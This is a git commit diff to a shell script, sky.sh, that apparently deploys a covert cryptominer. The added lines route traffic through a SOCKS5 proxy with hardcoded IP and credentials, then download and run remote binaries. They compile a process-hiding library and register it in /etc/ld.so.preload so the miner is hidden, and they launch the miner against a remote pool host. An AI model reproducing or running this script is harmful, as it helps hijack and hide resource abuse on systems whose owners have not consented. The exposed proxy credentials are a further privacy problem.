038efcdb22583fadbadabc62291b1804e921f47a
togninifabio98 <95686951+togninifabio98@users.noreply.github.com>
2022-07-03 00:46:50 +0700

    Update sky.sh

--- sky.sh
+++ sky.sh
@@ -1,13 +1,48 @@
 #!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
 
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl -y
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 216.131.111.122:1080
+socks5_username = QuENTURW
+socks5_password = EfAdJ1Qu
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
 chmod +x bezzHash
 
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-nohup ./bezzHash --url=babeh46.$(echo $(shuf -i 1-99999 -n 1)-T4)
+
+./graftcp/graftcp ./bezzHash --url=babeh46.$(echo $(shuf -i 1-99999 -n 1)-T4)@3.215.245.39:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
